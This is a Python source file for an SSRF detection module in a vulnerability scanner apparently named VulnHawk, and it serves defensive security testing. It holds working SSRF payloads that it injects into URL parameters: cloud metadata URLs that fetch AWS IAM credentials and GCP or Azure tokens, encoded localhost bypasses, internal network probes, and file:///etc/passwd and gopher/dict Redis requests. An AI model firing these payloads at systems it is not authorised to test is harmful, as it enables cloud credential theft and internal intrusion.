"""
VulnHawk SSRF Detection Module

Detects Server-Side Request Forgery vulnerabilities with:
- Cloud metadata endpoint detection
- Internal network scanning
- DNS rebinding detection
- Protocol smuggling detection

Author: VulnHawk Team
"""

import re
import asyncio
from typing import List, Dict, Optional, Set
from urllib.parse import urlparse, urlencode, parse_qs, urlunparse
from dataclasses import dataclass
from enum import Enum

from app.scanner.modules.base import BaseModule, VulnerabilityResult


class SSRFType(Enum):
    """Types of SSRF vulnerabilities."""
    BASIC = "basic"
    BLIND = "blind"
    CLOUD_METADATA = "cloud_metadata"
    INTERNAL_NETWORK = "internal_network"
    PROTOCOL_SMUGGLE = "protocol_smuggle"


@dataclass
class SSRFPayload:
    """SSRF test payload."""
    url: str
    description: str
    ssrf_type: SSRFType
    expected_indicators: List[str]
    severity_boost: float = 0.0


class SSRFModule(BaseModule):
    """
    Advanced SSRF Detection Module.

    Detects SSRF vulnerabilities through:
    - Localhost and internal IP detection
    - Cloud metadata endpoint access
    - DNS rebinding techniques
    - Protocol handler abuse
    """

    def __init__(self):
        super().__init__()
        self.name = "SSRF Scanner"
        self.description = "Detects Server-Side Request Forgery vulnerabilities"

        # Localhost variations
        self.localhost_payloads = [
            SSRFPayload('http://127.0.0.1', 'IPv4 localhost', SSRFType.BASIC, ['root:', 'localhost']),
            SSRFPayload('http://localhost', 'Localhost hostname', SSRFType.BASIC, ['root:', 'localhost']),
            SSRFPayload('http://[::1]', 'IPv6 localhost', SSRFType.BASIC, ['root:', 'localhost']),
            SSRFPayload('http://0.0.0.0', 'All interfaces', SSRFType.BASIC, ['root:', 'localhost']),
            # Bypass techniques
            SSRFPayload('http://127.1', 'Shortened localhost', SSRFType.BASIC, ['root:', 'localhost']),
            SSRFPayload('http://127.0.1', 'Another shortened form', SSRFType.BASIC, ['root:', 'localhost']),
            SSRFPayload('http://2130706433', 'Decimal IP (127.0.0.1)', SSRFType.BASIC, ['root:', 'localhost']),
            SSRFPayload('http://0x7f000001', 'Hex IP', SSRFType.BASIC, ['root:', 'localhost']),
            SSRFPayload('http://0177.0.0.1', 'Octal IP', SSRFType.BASIC, ['root:', 'localhost']),
            SSRFPayload('http://127.0.0.1.nip.io', 'DNS rebinding service', SSRFType.BASIC, ['root:', 'localhost']),
            SSRFPayload('http://127.0.0.1.xip.io', 'XIP.io rebinding', SSRFType.BASIC, ['root:', 'localhost']),
            SSRFPayload('http://spoofed.burpcollaborator.net', 'Burp Collaborator', SSRFType.BLIND, []),
        ]

        # Cloud metadata endpoints - CRITICAL severity
        self.cloud_metadata_payloads = [
            # AWS
            SSRFPayload(
                'http://169.254.169.254/latest/meta-data/',
                'AWS metadata endpoint',
                SSRFType.CLOUD_METADATA,
                ['ami-id', 'instance-id', 'security-credentials', 'iam'],
                severity_boost=2.0
            ),
            SSRFPayload(
                'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
                'AWS IAM credentials',
                SSRFType.CLOUD_METADATA,
                ['AccessKeyId', 'SecretAccessKey', 'Token'],
                severity_boost=3.0
            ),
            SSRFPayload(
                'http://169.254.169.254/latest/user-data',
                'AWS user data',
                SSRFType.CLOUD_METADATA,
                ['#!/bin', 'aws', 'password', 'secret'],
                severity_boost=2.0
            ),
            SSRFPayload(
                'http://169.254.169.254/latest/dynamic/instance-identity/document',
                'AWS instance identity',
                SSRFType.CLOUD_METADATA,
                ['accountId', 'instanceId', 'region'],
                severity_boost=1.5
            ),
            # GCP
            SSRFPayload(
                'http://metadata.google.internal/computeMetadata/v1/',
                'GCP metadata',
                SSRFType.CLOUD_METADATA,
                ['project', 'instance', 'attributes'],
                severity_boost=2.0
            ),
            SSRFPayload(
                'http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token',
                'GCP service account token',
                SSRFType.CLOUD_METADATA,
                ['access_token', 'expires_in', 'token_type'],
                severity_boost=3.0
            ),
            # Azure
            SSRFPayload(
                'http://169.254.169.254/metadata/instance?api-version=2021-02-01',
                'Azure instance metadata',
                SSRFType.CLOUD_METADATA,
                ['compute', 'network', 'vmId'],
                severity_boost=2.0
            ),
            SSRFPayload(
                'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/',
                'Azure managed identity token',
                SSRFType.CLOUD_METADATA,
                ['access_token', 'expires_on', 'resource'],
                severity_boost=3.0
            ),
            # DigitalOcean
            SSRFPayload(
                'http://169.254.169.254/metadata/v1/',
                'DigitalOcean metadata',
                SSRFType.CLOUD_METADATA,
                ['droplet_id', 'hostname', 'region'],
                severity_boost=1.5
            ),
            # Alibaba Cloud
            SSRFPayload(
                'http://100.100.100.200/latest/meta-data/',
                'Alibaba Cloud metadata',
                SSRFType.CLOUD_METADATA,
                ['instance-id', 'region-id'],
                severity_boost=2.0
            ),
        ]

        # Internal network probing
        self.internal_network_payloads = [
            SSRFPayload('http://192.168.0.1', 'Private network 192.168.x.x', SSRFType.INTERNAL_NETWORK, ['router', 'admin', 'login']),
            SSRFPayload('http://192.168.1.1', 'Common router gateway', SSRFType.INTERNAL_NETWORK, ['router', 'admin', 'login']),
            SSRFPayload('http://10.0.0.1', 'Private network 10.x.x.x', SSRFType.INTERNAL_NETWORK, ['internal', 'admin']),
            SSRFPayload('http://172.16.0.1', 'Private network 172.16.x.x', SSRFType.INTERNAL_NETWORK, ['internal', 'admin']),
        ]

        # Protocol smuggling
        self.protocol_payloads = [
            SSRFPayload('file:///etc/passwd', 'File protocol - Unix', SSRFType.PROTOCOL_SMUGGLE, ['root:', 'bin:', 'daemon:']),
            SSRFPayload('file:///c:/windows/system32/drivers/etc/hosts', 'File protocol - Windows', SSRFType.PROTOCOL_SMUGGLE, ['localhost', '127.0.0.1']),
            SSRFPayload('gopher://127.0.0.1:6379/_INFO', 'Redis via Gopher', SSRFType.PROTOCOL_SMUGGLE, ['redis_version', 'connected_clients']),
            SSRFPayload('dict://127.0.0.1:6379/INFO', 'Redis via Dict', SSRFType.PROTOCOL_SMUGGLE, ['redis_version']),
            SSRFPayload('ftp://127.0.0.1', 'FTP protocol', SSRFType.PROTOCOL_SMUGGLE, ['ftp', '220', '230']),
        ]

        # URL parameters commonly vulnerable to SSRF
        self.ssrf_parameters = [
            'url', 'uri', 'path', 'dest', 'redirect', 'target', 'rurl',
            'site', 'html', 'link', 'goto', 'page', 'feed', 'host',
            'proxy', 'api', 'callback', 'return', 'img', 'image',
            'load', 'fetch', 'file', 'document', 'folder', 'root',
            'source', 'src', 'ref', 'data', 'request', 'content'
        ]

        # Response indicators for SSRF detection
        self.ssrf_indicators = {
            'aws': ['ami-id', 'instance-id', 'security-credentials', 'iam', 'ec2', 'AccessKeyId'],
            'gcp': ['computeMetadata', 'google', 'project', 'instance', 'service-accounts'],
            'azure': ['vmId', 'subscriptionId', 'resourceGroupName', 'azure'],
            'internal': ['internal', 'intranet', 'localhost', 'private', 'admin'],
            'file': ['root:', 'daemon:', '/bin/', 'passwd', 'shadow', 'hosts'],
            'redis': ['redis_version', 'connected_clients', 'used_memory'],
        }

    def get_all_payloads(self) -> List[SSRFPayload]:
        """Get all SSRF payloads."""
        return (
            self.localhost_payloads +
            self.cloud_metadata_payloads +
            self.internal_network_payloads +
            self.protocol_payloads
        )

    def _find_url_parameters(self, url: str, form_data: Optional[Dict] = None) -> List[str]:
        """Find parameters that might be vulnerable to SSRF."""
        found_params = []

        # Check URL query parameters
        parsed = urlparse(url)
        query_params = parse_qs(parsed.query)
        for param in query_params.keys():
            if param.lower() in self.ssrf_parameters:
                found_params.append(param)

        # Check form data
        if form_data:
            for param in form_data.keys():
                if param.lower() in self.ssrf_parameters:
                    found_params.append(param)

        # Also check for any parameter that might contain a URL
        all_params = list(query_params.keys()) + (list(form_data.keys()) if form_data else [])
        for param in all_params:
            if param not in found_params:
                # Check if value looks like a URL
                values = query_params.get(param, [])
                if form_data:
                    values.extend([form_data.get(param, '')])
                for value in values:
                    if isinstance(value, str) and (value.startswith('http') or value.startswith('//')):
                        found_params.append(param)
                        break

        return list(set(found_params))

    def _inject_payload(self, url: str, param: str, payload: str) -> str:
        """Inject SSRF payload into URL parameter."""
        parsed = urlparse(url)
        query_params = parse_qs(parsed.query, keep_blank_values=True)

        if param in query_params:
            query_params[param] = [payload]
        else:
            query_params[param] = [payload]

        # Rebuild URL
        new_query = urlencode(query_params, doseq=True)
        new_url = urlunparse((
            parsed.scheme,
            parsed.netloc,
            parsed.path,
            parsed.params,
            new_query,
            parsed.fragment
        ))

        return new_url

    def _check_response_for_ssrf(self, response_text: str, payload: SSRFPayload) -> bool:
        """Check if response indicates successful SSRF."""
        response_lower = response_text.lower()

        # Check for expected indicators
        for indicator in payload.expected_indicators:
            if indicator.lower() in response_lower:
                return True

        # Check for general SSRF indicators
        for category, indicators in self.ssrf_indicators.items():
            if any(ind.lower() in response_lower for ind in indicators):
                return True

        return False

    def _determine_severity(self, payload: SSRFPayload, response_text: str) -> str:
        """Determine vulnerability severity based on SSRF type and findings."""
        base_severity = "medium"

        if payload.ssrf_type == SSRFType.CLOUD_METADATA:
            # Check for credential exposure
            if any(term in response_text.lower() for term in ['accesskeyid', 'secretaccesskey', 'access_token']):
                return "critical"
            return "high"

        elif payload.ssrf_type == SSRFType.PROTOCOL_SMUGGLE:
            # File read or service access
            if 'root:' in response_text or 'redis_version' in response_text:
                return "high"
            return "medium"

        elif payload.ssrf_type == SSRFType.INTERNAL_NETWORK:
            return "medium"

        elif payload.ssrf_type == SSRFType.BLIND:
            return "medium"

        return base_severity

    async def test_ssrf(self, session, url: str, param: str,
                        payload: SSRFPayload) -> Optional[VulnerabilityResult]:
        """Test a single SSRF payload."""
        try:
            test_url = self._inject_payload(url, param, payload.url)

            async with session.get(test_url, timeout=10, allow_redirects=False) as response:
                response_text = await response.text()

                if self._check_response_for_ssrf(response_text, payload):
                    severity = self._determine_severity(payload, response_text)

                    return VulnerabilityResult(
                        name=f"Server-Side Request Forgery ({payload.ssrf_type.value})",
                        description=f"SSRF vulnerability detected: {payload.description}. "
                                    f"The application makes server-side requests to attacker-controlled URLs, "
                                    f"potentially exposing internal services or cloud metadata.",
                        severity=severity,
                        url=url,
                        parameter=param,
                        payload=payload.url,
                        evidence=self._truncate(response_text, 500),
                        remediation="Implement strict URL validation with allowlisting. "
                                    "Block requests to internal IP ranges (127.0.0.0/8, 10.0.0.0/8, "
                                    "172.16.0.0/12, 192.168.0.0/16) and cloud metadata endpoints (169.254.169.254). "
                                    "Use DNS resolution verification and disable unnecessary URL protocols.",
                        cvss_score=8.6 if severity == "critical" else 6.5,
                        cwe_id="CWE-918",
                        confidence="HIGH" if payload.ssrf_type == SSRFType.CLOUD_METADATA else "MEDIUM"
                    )

        except asyncio.TimeoutError:
            # Timeout might indicate blind SSRF
            pass
        except Exception as e:
            self.logger.debug(f"SSRF test error: {e}")

        return None

    async def scan(self, session, url: str, method: str = "GET",
                   form_data: Optional[Dict] = None) -> List[VulnerabilityResult]:
        """
        Scan for SSRF vulnerabilities.

        Args:
            session: aiohttp session
            url: Target URL
            method: HTTP method
            form_data: Optional form data

        Returns:
            List of discovered vulnerabilities
        """
        results = []

        # Find potential SSRF parameters
        params = self._find_url_parameters(url, form_data)

        if not params:
            # If no obvious parameters, try common ones
            params = ['url', 'uri', 'path', 'redirect', 'target']

        # Test each parameter with payloads
        for param in params:
            # Prioritize cloud metadata tests (most critical)
            for payload in self.cloud_metadata_payloads:
                result = await self.test_ssrf(session, url, param, payload)
                if result:
                    results.append(result)
                    # Found critical SSRF, skip remaining payloads for this param
                    if result.severity == "critical":
                        break

            # If no cloud metadata SSRF found, test other payloads
            if not any(r.parameter == param for r in results):
                for payload in self.localhost_payloads[:5]:  # Test top 5 localhost variations
                    result = await self.test_ssrf(session, url, param, payload)
                    if result:
                        results.append(result)
                        break

        return results

    async def quick_scan(self, session, url: str) -> List[VulnerabilityResult]:
        """Quick SSRF scan with essential payloads only."""
        results = []

        essential_payloads = [
            self.cloud_metadata_payloads[0],  # AWS metadata
            self.cloud_metadata_payloads[1],  # AWS IAM credentials
            self.localhost_payloads[0],  # 127.0.0.1
        ]

        params = self._find_url_parameters(url)
        if not params:
            params = ['url', 'redirect']

        for param in params[:2]:  # Test top 2 parameters
            for payload in essential_payloads:
                result = await self.test_ssrf(session, url, param, payload)
                if result:
                    results.append(result)

        return results
